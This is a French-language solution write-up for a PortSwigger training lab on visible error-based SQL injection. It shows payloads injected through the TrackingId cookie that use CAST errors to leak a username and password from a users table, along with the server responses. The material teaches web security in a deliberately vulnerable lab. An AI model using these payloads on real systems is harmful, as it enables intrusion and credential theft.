# Lab

https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

## Solution

Le cookie `TrackingId` est vulnérable à une injection SQL. On peut le vérifier en envoyant la requête suivante :

```http
Cookie: TrackingId=';
```

On obtient l'erreur suivante :

```
Unterminated string literal started at position 36 in SQL SELECT * FROM tracking WHERE id = '''. Expected  char
```

Si on essaie avec `'--` on a plus l'erreur, donc le SQL est bien injecté.

Puisque les erreurs sont visibles, on peut utiliser le texte de retour pour récupérer des données.

```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

On obtient l'erreur suivante :

```
ERROR: invalid input syntax for type integer: "administrator"
```

Maintenant on récupère le mot de passe :

```http
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

On obtient l'erreur suivante :

```
ERROR: invalid input syntax for type integer: "svuuh15ihql7dssqadql"
```
